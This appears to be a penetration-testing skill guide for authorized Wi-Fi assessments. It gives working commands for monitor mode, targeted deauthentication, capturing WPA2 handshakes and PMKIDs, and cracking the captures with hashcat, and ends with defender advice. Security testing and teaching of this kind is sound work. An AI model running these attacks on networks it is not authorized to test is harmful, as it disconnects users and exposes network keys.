---
name: wireless-wpa
description: Use when testing Wi-Fi security on authorized engagements with
  written permission covering the wireless network. Covers putting adapters
  into monitor mode, surveying access points and clients with airodump-ng,
  capturing WPA and WPA2 four-way handshakes with targeted deauthentication,
  cracking captures with aircrack-ng and hashcat, and the clientless PMKID
  attack. Use when the scope names an SSID or office wireless, or when you
  need to prove a weak pre-shared key before a wired test begins.
version: 1.0.0
domain: network
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [recon-active]
tools:
  - name: aircrack-ng
    version: "1.7"
  - name: hashcat
    version: 6.2.6
  - name: Wireshark
    version: "4.4"
---

WPA2-PSK security rests entirely on the pre-shared key: capture the four-way
handshake (or a PMKID) and the key becomes an offline cracking problem. This
skill covers authorized wireless assessment with the aircrack-ng suite:
preparing a monitor mode adapter, surveying the airspace, capturing
handshakes with minimal disruption, converting captures for hashcat, and
cracking with wordlists and rules. It covers WPA and WPA2 personal modes and
notes where WPA3 changes the game. Wireless testing needs explicit written
permission for the target network, and deauthentication is used sparingly
because it briefly disconnects legitimate clients. All testing targets
systems you have written permission to test.

## Quick Workflow

1. Confirm the target SSID and BSSID are in the written scope, and check
   local law on wireless testing.
2. Put a compatible adapter into monitor mode and verify it captures.
3. Survey the airspace: list access points, channels, signal, and clients.
4. Lock onto the target channel and capture a four-way handshake,
   deauthenticating one client at a time if needed.
5. Verify the capture contains a full handshake before leaving the site.
6. Convert the capture and crack it offline with hashcat or aircrack-ng.
7. Document the key strength result and re-secure notes on what was found.

## 1. Prepare the adapter

You need a USB adapter with a chipset that supports monitor mode and packet
injection (Atheros AR9271 and Ralink RT3070 class chips are the classic
safe choices). Built-in laptop cards often lack injection.

```bash
# List wireless interfaces
iwconfig 2>/dev/null | grep -E '^[a-z]' | cut -d' ' -f1
ip link | grep -E 'wl|wlan'

# Kill processes that fight for the adapter (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Start monitor mode on wlan0
sudo airmon-ng start wlan0
```

`airmon-ng start` creates `wlan0mon`. Verify monitor mode is real:

```bash
iwconfig wlan0mon | grep -i mode
# Expect: Mode:Monitor

# Quick capture sanity check: you should see beacon frames
sudo timeout 10 airodump-ng wlan0mon | head -20
```

If `airmon-ng` fails, set monitor mode manually:

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
iw dev wlan0 info | grep type
```

## 2. Survey the airspace

Run a broad survey first to map every network, then narrow to the target.
Record BSSIDs, channels, signal strength, encryption, and associated
clients.

```bash
# Full survey, writing all formats for later review
sudo airodump-ng wlan0mon -w /tmp/survey --output-format csv,cap

# Survey one band to reduce noise (2.4 GHz channels 1-11 example)
sudo airodump-ng wlan0mon --band bg -w /tmp/survey-bg
```

Let it run two to three minutes. In the top table, find the target SSID and
note its BSSID, channel (CH), and privacy flags (WPA2, CCMP, PSK). In the
bottom table, note client STATIONs tied to that BSSID; you need at least one
connected client for a deauth-driven handshake capture.

```bash
# Parse the CSV for the target network quickly
grep -i "TargetSSID" /tmp/survey-01.csv | head -5
```

## 3. Capture the four-way handshake

Lock the adapter to the target channel and capture only the target BSSID.
This keeps the capture small and avoids touching other networks.

```bash
# Targeted capture: BSSID and channel from the survey
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 \
  -w /tmp/target --output-format cap
```

Leave that running in one terminal. In a second terminal, wait for the top
right of airodump to show `WPA handshake: AA:BB:CC:DD:EE:FF`. Handshakes
happen naturally when clients join; if none appears after a few minutes,
deauthenticate one client to force a reconnect:

```bash
# Deauth ONE client (its MAC from the survey), 5 bursts, then stop
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

Rules for deauth: one client at a time, short bursts, never broadcast
deauth (`-c` omitted hits everyone and is disruptive). Watch the airodump
window for the handshake line, then stop both commands. Verify the capture
before you pack up:

```bash
# Check the capture really holds a full handshake (EAPOL 1-4)
sudo aircrack-ng /tmp/target-01.cap | head -20
# Look for: "1 handshake" next to the target network line

# Deeper check with tshark: count EAPOL key frames
tshark -r /tmp/target-01.cap -Y eapol 2>/dev/null | wc -l
```

Four EAPOL frames (messages 1 through 4, or at least 1 and 2) mean a
crackable handshake. If aircrack-ng says `0 handshake`, the capture missed
it; repeat the deauth once more.

## 4. Crack the handshake offline

Cracking is offline and safe to run anywhere. Convert the capture to
hashcat format for speed, or crack directly with aircrack-ng for simplicity.

```bash
# Convert cap to hashcat mode 22000 format
hcxpcapngtool -o /tmp/target.22000 /tmp/target-01.cap

# hashcat WPA crack with a wordlist
hashcat -m 22000 /tmp/target.22000 /usr/share/wordlists/rockyou.txt

# Show the cracked key
hashcat -m 22000 /tmp/target.22000 --show
```

```bash
# aircrack-ng direct crack (simpler, slower, no conversion)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b AA:BB:CC:DD:EE:FF /tmp/target-01.cap
```

Improve hit rate with rules and targeted lists before resorting to masks:

```bash
# Best64 rules mutate each word 64 ways (fast, high value)
hashcat -m 22000 /tmp/target.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Company-specific wordlist first: SSID variants, site names, years, seasons
# Build it during recon, then:
hashcat -m 22000 /tmp/target.22000 /tmp/custom-words.txt -r /usr/share/hashcat/rules/best64.rule
```

WPA keys must be at least 8 characters, so short-wordlist attacks rarely
work; rules that append years and symbols (`Company2024!`) are where real
keys fall.

## 5. The PMKID attack (clientless)

Some access points include the PMKID in their first EAPOL frame or in
association responses, which lets you capture crackable material without
any client and without deauthentication.

```bash
# Capture PMKIDs passively with hcxdumptool (part of hcxtools)
sudo hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --enable_status=1

# Convert and crack like a handshake
hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
hashcat -m 22000 /tmp/pmkid.22000 /usr/share/wordlists/rockyou.txt --show
```

Let hcxdumptool run several minutes per target; PMKIDs arrive slowly. Not
all APs expose them, so treat this as a bonus alongside the handshake
capture, not a replacement.

## 6. Prove impact and note WPA3

A cracked PSK proves the wireless network is open to anyone in range.
Document the key strength (length, pattern) without printing the full key
in the report unless the client asks for it. If the key resists cracking,
report the handshake capture as proof of a strong key, which is a positive
finding.

WPA3-Personal (SAE) resists offline dictionary attacks: the handshake no
longer yields crackable material the same way, and deauth-based capture is
far less useful. Against WPA3, focus on downgrade opportunities (is WPA2
transition mode enabled?), weak SAE passwords via active guessing limits,
and rogue AP or evil twin scenarios only where explicitly in scope.

## Edge cases

- The adapter has no monitor mode. Check `iw list | grep -A8 "Supported
  interface modes"`; if monitor is absent, you need different hardware.
- Injection test fails (`aireplay-ng --test`). Some drivers capture but
  cannot inject; use passive handshake waiting instead of deauth.
- No clients are connected. Without clients there is no handshake to
  capture; use the PMKID attack or wait for a client to join.
- The handshake never completes in the capture. The client may roam or
  the signal is weak; move closer to the AP and retry with a fresh
  capture file.
- 5 GHz targets need a dual band adapter and `--band abg` in the survey;
  a 2.4 GHz only card never sees them.
- aircrack-ng reports handshake but hashcat finds nothing. Verify with
  `--show` that you are attacking the right network; multi-BSSID captures
  confuse both tools.
- The AP uses WPA2-Enterprise (802.1X). PSK attacks do not apply; that is
  a different engagement (RADIUS and certificate attacks) and needs its
  own scope.

## Escalation

- The PSK will not crack with rockyou plus rules. Build a targeted
  wordlist from OSINT on the company (names, dates, products, sports
  teams) and try mask attacks on the pattern you observe.
- Deauth is forbidden by the scope. Rely on passive capture and the PMKID
  attack only, and note the constraint in the report.
- Multiple SSIDs share one BSSID. Capture once; the handshake works per
  SSID, so confirm which SSID the cracked key belongs to.
- You need to prove lateral value of the key. Connecting to the network
  with the cracked PSK is a separate authorization step; get it in
  writing before joining, then treat it as a new internal test.

## Detection and defender view

Defenders see handshake capture as a monitor mode adapter probing and a
burst of deauthentication frames, which wireless intrusion detection
systems flag as a deauth attack signature. Cracking itself is offline and
invisible. The durable fixes: long random pre-shared keys (20+ characters)
stored in a password manager, WPA3-Personal or WPA2-Enterprise instead of
PSK where possible, a wireless IDS to alert on deauth floods and rogue
APs, and rotating the PSK when staff leave. Separate guest, corporate, and
IoT networks so one cracked key does not expose everything.

## Key references

- MITRE ATT&CK T1110.002 (Brute Force, Password Cracking): PSK cracking.
- MITRE ATT&CK T1557 (Adversary-in-the-Middle): evil twin context.
- CWE-327 (Use of a Broken or Risky Cryptographic Algorithm): weak PSK
  practices and deprecated modes.
- CWE-798 (Use of Hard-coded Credentials): PSKs shared in the open.
- IEEE 802.11i (WPA2) and 802.11-2020 (WPA3 SAE) standards.
- aircrack-ng documentation: https://www.aircrack-ng.org/documentation.html
- hashcat WPA modes: https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
